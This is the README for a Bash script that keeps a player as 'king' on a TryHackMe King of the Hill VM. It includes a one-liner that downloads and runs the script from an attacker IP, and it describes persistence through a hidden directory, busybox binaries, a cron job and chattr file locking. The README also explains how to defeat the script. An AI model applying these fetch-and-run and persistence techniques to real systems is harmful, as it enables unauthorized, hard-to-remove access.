# KingMe
Bash script that helps you maintain your rightful place as king on any Linux box while playing
King of the Hill on TryHackMe.com

## DISCLAIMER
As far as I know, it is not against the rules of THM KotH to use a script like this.
However, I am not responsible if you get banned because you used this script.
Use at your own risk.

## How to use it
Firstly, you must be root on the KotH VM in order for this script to work.

On your attacker machine in the same directory as KingMe, start an http server to host all the files on port 8080 (Note: The http port used to serve the files must be 8080 as it is hard-coded in this script).
This python one-liner works pretty well for that:
>`python -m http.server 8080`

Next, on the KotH VM, use wget to get the kingme.sh script like so:
>`wget http://<attacker IP>:8080/kingme.sh`

Then, make kingme.sh executable:
>`chmod u+x kingme.sh`

Finally, run kingme.sh and take your rightful place as king!
>`./kingme.sh -u <THM Username> -i <attacker IP> -d <secret working dir>`
Or run as a backgroud process!
>`./kingme.sh -u <THM Username> -i <attacker IP> -d <secret working dir> &`

You can also be super 31337 with this one-liner to do everything:
>`wget http://<attacker IP>:8080/kingme.sh && chmod u+x kingme.sh && ./kingme.sh -u <THM Username> -i <attacker IP> -d <secret working dir> &`

(Note: `-u` and `-i` are required but `-d` is optional. If blank, it will default to `/var/kingme`)

## How it works
KingMe sets up a secret working directory, and then downloads several busybox bins to that
working directory. This will allow the script to run properly even if at some point the bins
on the KotH VM are moved or messed with. The script then sets up a cron job to maintain your reign in 
case the user's shell is terminated or the script stops running for some reason. Finally, 
the magic happens. Every second KingMe checks /root/king.txt for your username. If it's not 
there, it puts your username in king.txt. It also locks the file with chattr making it more
difficult to edit by other players. This should maintain a player as king indefinitely, unless
another player figures out what's going on and stops it.

## How to defeat KingMe
Simply finding and removing the secret working directory will break this script since it relies on 
bins located in that directory. Also, removing the crontab entry, and killing any running processes 
should do the trick as well.

## Future Plans
- Add more protections for king.txt
- Add more counter-measures for tricks used by other players
- Create some sort of backup so that the script will continue to run even if our secret working dir and/or processes are found

## Version Notes
- v0.1 
  - Initial release written after some shower thoughts late at night
- v0.2 
  - Added steps to rename the busybox bins and make them executable (don't know how I missed this...)
  - Added wget commands for the bins (just in case)
  - Added some noclobber stuff
  - Updated "Future Plans" section of README.
- v0.3
  - Fixed the cronjob section since it was not working and creating way too many processes
- v1.0 
  - Full release!
  - Added arg parsing for easier use
  - Added counter-measure for mount trick
  - Made the secret working directory dynamic
  - Removed curl commands in favor of wget commands
  - Cleaned up README
